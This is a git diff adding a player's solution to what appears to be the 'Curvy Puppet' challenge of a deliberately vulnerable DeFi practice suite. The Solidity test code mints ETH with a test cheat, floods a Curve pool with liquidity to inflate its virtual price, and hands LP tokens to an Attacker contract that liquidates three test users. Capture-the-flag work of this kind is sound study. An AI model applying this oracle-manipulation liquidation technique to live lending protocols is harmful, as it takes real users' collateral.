@@ -9,6 +9,11 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
+import {Attacker} from "./Attacker.sol";
+
+interface ICurvePool {
+    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable;
+}
 
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -113,8 +118,8 @@ contract CurvyPuppetChallenge is Test {
             expiration: uint48(block.timestamp)
         });
         // Deposit collateral + borrow
-        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
-        lending.borrow(USER_BORROW_AMOUNT);
+        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE); // collateral: 2500e18 dvt
+        lending.borrow(USER_BORROW_AMOUNT); // borrow: 1e18 lp tokens
     }
 
     /**
@@ -158,7 +163,45 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
+        // borrowValue = 175 * borrowAmt * 4e21 * virtual / 1e18 / 1e18 = (700e3 * borrowAmt * virtual / 1e18)
+        // collateralValue = 100 * collateralAmt * 10e18 / 1e18 = 1e3 * collateralAmt
+
+        // liquidate condition: (700e3 * borrowAmt * virtual) / 1e18 > 1e3 * collateralAmt
+        // borrowAmt = 1e18, collateralAmt = 2500e18 
+        // virtual > 1e18 * 1e3 * 2500 / 700e3 > 3.57e18
+
+        // vp = D * PRECISION / token_supply
+
+        // prepare more liquidity
+        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
+        weth.withdraw(TREASURY_WETH_BALANCE);
+        vm.deal(player, 855430000 ether);
+        uint256 ethBalance = player.balance;
+        //uint256 swapEthAmount = ethBalance;
         
+        //ICurvePool(payable(address(curvePool))).exchange{value: swapEthAmount}(0, 1, swapEthAmount, swapEthAmount);
+        
+        ethBalance = player.balance;
+        uint256 stEthBalance = stETH.balanceOf(player);
+        IERC20(stETH).approve(address(curvePool), stEthBalance);
+        uint256 lps = IStableSwap(curvePool).add_liquidity{value: ethBalance}([uint(ethBalance), stEthBalance],0);
+        console.log("get lp for liquidity:", lps);
+        // half of lp:    182336164580211527892, vp: 1098527560230583866
+        // all eth lps:   182336152088071053934 ,vp: 1098527560232770209
+        // all stEth lps: 182318100969514217697, vp: 1098527558688880563
+        address[] memory users = new address[](3);
+        users[0] = alice;
+        users[1] = bob;
+        users[2] = charlie;
+        Attacker attacker = new Attacker(dvt, curvePool, lending, users);
+        IERC20(curvePool.lp_token()).transfer(address(attacker), lps);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE);
+        attacker.attack();
+        weth.deposit{value: address(player).balance}();
+        uint256 wethBalance = weth.balanceOf(player);
+        weth.transfer(treasury, wethBalance);
+        IERC20(curvePool.lp_token()).transfer(address(treasury), IERC20(curvePool.lp_token()).balanceOf(player));
+        dvt.transfer(treasury, dvt.balanceOf(player));
     }
 
     /**
